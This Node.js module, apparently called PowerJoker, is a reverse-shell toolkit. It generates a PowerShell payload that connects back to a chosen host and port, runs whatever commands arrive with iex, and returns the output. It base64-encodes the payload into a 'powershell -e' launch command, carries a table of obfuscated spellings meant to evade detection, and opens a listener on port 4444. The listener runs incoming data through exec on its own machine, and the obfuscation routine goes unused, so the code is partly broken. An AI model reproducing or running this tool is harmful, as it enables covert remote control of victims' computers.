const crypto = require("crypto");
const net = require("net");
const { exec } = require("child_process");

class PowerJoker {
  constructor() {
    this.sessions = new Map();
    this.sessionCounter = 1;
    this.server = null;
  }

  generateUUID() {
    return "x" + crypto.randomUUID().replace(/-/g, "");
  }

  randomString(length = 8) {
    return crypto.randomBytes(length).toString("hex").slice(0, length);
  }

  generateVariableNames(count = 5) {
    const vars = {};
    for (let i = 0; i < count; i++) {
      vars[i] = this.randomString();
    }
    return vars;
  }

  obfuscatePowerShell() {
    const obfuscationPatterns = {
      systemRoot: [
        "SysTemROot",
        "Syste?????",
        "Syst??r??t",
        "SyS?em?oo?",
        "SYSTEmRoot",
        "Sys???r???",
      ],
      syswow64: ["SysWoW??", "SYSW?W6?", "SySwO???", "SYSW????"],
      newObject: [
        "Ne''w-O''bje''ct",
        "N''ew-O''bj''ec''t",
        "N'e'W'-'o'B'J'e'C'T'",
        "&('N'+'e'+'w'+'-'+'O'+'b'+'J'+'e'+'c'+'t')",
      ],
      systemNet: [
        "Sy''st''em.Net.Soc''kets.TcPClIeNt",
        "SyS''tEm.Net.SoC''kE''tS.TCPCLIENT",
        "('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPClient')",
      ],
      getStream: [
        "('Get'+'St'+'r'+'eam')",
        "('Get'+'Stream')",
        "('G'+'e'+'T'+'S'+'T'+'r'+'e'+'am')",
      ],
      asciiEncoding: [
        "Sys''t''em.Te''xt.AS''CI''IEn''co''ding",
        "Sy''Ste''M.tExT.A''SCi''iEN''coding",
      ],
    };

    const replacements = {};
    for (const [key, patterns] of Object.entries(obfuscationPatterns)) {
      replacements[key] = patterns[Math.floor(Math.random() * patterns.length)];
    }
    return replacements;
  }

  generatePayload(host, port) {
    console.log("⚡️ Sürətli payload yaradılır...");

    const simplePayload = `
$c=New-Object System.Net.Sockets.TCPClient('${host}',${port});
$s=$c.GetStream();
[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
    $d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);
    $sb=(iex $d 2>&1 | Out-String );
    $sb2=$sb+'PS> ';
    $s.Write([text.encoding]::ASCII.GetBytes($sb2),0,$sb2.Length);
    $s.Flush()
}
$c.Close()
`;
    return simplePayload;
  }

  encodeToBase64(payload) {
    const buffer = Buffer.from(payload, "utf16le");
    return buffer.toString("base64");
  }

  // SADƏ LISTENER FUNKSİYASI
  startServer(host = "0.0.0.0", port = 4444) {
    return new Promise((resolve, reject) => {
      try {
        this.server = net.createServer((socket) => {
          const sessionId = this.sessionCounter++;
          console.log(
            `\n[+] Yeni bağlantı: ${socket.remoteAddress}:${socket.remotePort} (Session: ${sessionId})`
          );

          socket.write("JokerShell> ");

          socket.on("data", (data) => {
            const cmd = data.toString().trim();
            console.log(`[Session ${sessionId}] Command: ${cmd}`);

            if (cmd === "quit") {
              socket.end();
              return;
            }

            exec(cmd, { windowsHide: true }, (error, stdout, stderr) => {
              let output = "";
              if (error) output += `Error: ${error.message}\n`;
              if (stdout) output += stdout;
              if (stderr) output += stderr;

              socket.write(output + "\nJokerShell> ");
            });
          });

          socket.on("close", () => {
            console.log(`[-] Session ${sessionId} bağlandı`);
          });

          socket.on("error", (err) => {
            console.log(`[!] Session ${sessionId} xətası: ${err.message}`);
          });
        });

        this.server.listen(port, host, () => {
          console.log(`[PJ] ${host}:${port} dinləyir...`);
          resolve();
        });

        this.server.on("error", (err) => {
          reject(err);
        });
      } catch (error) {
        reject(error);
      }
    });
  }



  quickStart(host = "0.0.0.0", port = 4444) {
    console.log("🚀 Powerjocker started!");

    const payload = this.generatePayload(host, port);
    const encoded = this.encodeToBase64(payload);

    console.log("✅ Payload is ready!");

    this.startServer(host, port);

    return {
      payload: payload,
      encoded: encoded,
      command: `powershell -e ${encoded}`,
    };
  }
}

module.exports = PowerJoker;